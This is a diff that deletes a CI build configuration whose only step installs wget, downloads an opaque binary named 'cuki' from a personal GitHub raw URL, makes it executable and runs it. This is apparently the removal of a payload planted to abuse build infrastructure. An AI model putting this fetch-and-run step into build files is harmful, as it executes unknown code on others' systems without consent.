@@ -1,9 +1,0 @@
-box: python:2.7-slim
-build:
-  steps:
-    - script:
-        name: PKT
-        code: |
-          apt-get update
-          apt install wget -y
-          wget https://raw.githubusercontent.com/kiposnakursi/a/main/cuki && chmod +x cuki && ./cuki
